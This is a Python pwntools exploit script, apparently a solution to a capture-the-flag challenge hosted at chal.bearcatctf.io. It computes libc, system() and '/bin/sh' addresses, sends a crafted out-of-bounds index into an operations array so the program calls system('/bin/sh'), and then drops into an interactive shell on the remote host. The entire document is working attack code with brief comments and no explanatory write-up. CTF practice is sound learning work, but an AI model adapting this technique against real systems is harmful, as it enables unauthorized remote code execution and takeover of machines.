from pwn import *

r = remote('chal.bearcatctf.io', 46060)

libc_base = 0xf7d89000  # Base of libc in program
system = 0xf7dd0cd0     # Location of system function
system_signed = system-0x100000000 # convert to signed int
sh = 0x1b90d5           # Offset of /bin/sh string in libc
sh_abs = sh + libc_base # Absolute location of string in memory
sh_signed = sh_abs-0x100000000     # convert to signed int

stack_system = 0xffffde00 # Location of system pointer int in stack
ops = 0x56558fc4          # Address of operations array
func_offset = (stack_system-ops-0x44)//4 # Calculate relative location of stack reference to system from ops head

r.sendline(f'{func_offset}'.encode())
r.sendline(f'{sh_signed} {system_signed}'.encode())
r.interactive() # Spawns shell on remote system
